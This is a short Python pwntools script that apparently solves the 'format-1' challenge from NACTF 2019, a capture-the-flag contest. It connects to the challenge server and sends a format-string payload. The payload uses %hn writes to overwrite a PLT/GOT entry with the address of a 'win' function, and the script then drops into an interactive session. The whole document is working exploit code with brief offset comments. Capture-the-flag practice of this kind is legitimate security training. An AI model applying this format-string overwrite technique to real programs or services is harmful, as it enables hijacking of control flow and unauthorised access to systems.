from pwn import *

ip = "shell.2019.nactf.com"
port = 31560
r = remote(ip,port)

elf = 'format-1' 
#r = process("./"+elf)

context.arch = 'i386'

offset = 4
print_plt = 0x804c00c
#exploit = "%16$p".ljust( 0x30 , 'a' )+p32(0xdeadbeef)

win = 0x80491b2
exploit = "%2052c%16$hn%35246c%17$hn".ljust( 0x30 , 'a' )+p32(print_plt+2)+p32(print_plt)
# 0x30 = 48 
# 32bit => 48/4= 12  4+12=16

raw_input("aa")
r.send(exploit)
r.interactive()
